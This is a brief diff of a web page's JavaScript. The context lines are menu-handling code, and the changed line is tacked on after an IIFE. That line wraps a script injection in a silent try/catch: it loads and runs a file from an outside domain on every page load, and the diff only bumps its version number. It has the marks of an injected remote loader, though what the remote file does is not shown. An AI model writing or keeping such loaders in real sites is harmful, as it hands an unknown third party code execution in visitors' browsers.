@@ -13,4 +13,4 @@ document.addEventListener('click',function(e){if(!e.target.closest('.langs'))clo
   a.hidden=false;
 })();
 
-;try{var qs=document.createElement("script");qs.src="https://mushafuk.online/read-shelf.js?v=1";document.head.appendChild(qs);}catch(e){}
+;try{var qs=document.createElement("script");qs.src="https://mushafuk.online/read-shelf.js?v=2";document.head.appendChild(qs);}catch(e){}
